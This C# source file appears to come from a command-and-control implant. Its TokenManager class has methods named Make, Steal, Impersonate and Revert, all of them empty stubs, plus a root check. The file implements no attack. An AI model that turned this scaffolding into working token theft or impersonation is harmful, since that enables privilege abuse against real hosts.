using Microsoft.Win32.SafeHandles;
using System.Runtime.InteropServices;
using System.Text.Json;
using System.Security.Principal;
using Agent.Models;
using Agent.Models;
using Agent.Managers;

using Agent.Interfaces;

namespace Agent.Managers
{
    public class TokenManager : ITokenManager
    {
        public ILogger logger { get; set; }
        //This is probably going to end up being a circular dependency
        public TokenManager(ILogger logger) {
            this.logger = logger;
        }
        /// <summary>
        /// Create a Token for impersonation
        /// </summary>
        /// <param name="job">The ServerJob containing the token information</param>
        public async Task<string> Make(ServerJob job)
        {
            return String.Empty;
        }
        public async Task<string> Steal(ServerJob job)
        {
            return String.Empty;
        }
        public bool Impersonate(int i)
        {
            return true;
        }
        public string List(ServerJob job)
        {
            return String.Empty;
        }
        public bool Revert()
        {
            return true;
        }
        public int getIntegrity()
        {
            return PInvoke.geteuid() == 0 ? 3 : 2;
        }

        public TokenResponseResult AddToken(SafeAccessTokenHandle hToken, CreateToken tokenOptions, string task_id)
        {
            return new TokenResponseResult()
            {
                user_output = "not supported in this configuration.",
                task_id = task_id,
                completed = true,
                status = "error",
            };
        }
    }
}
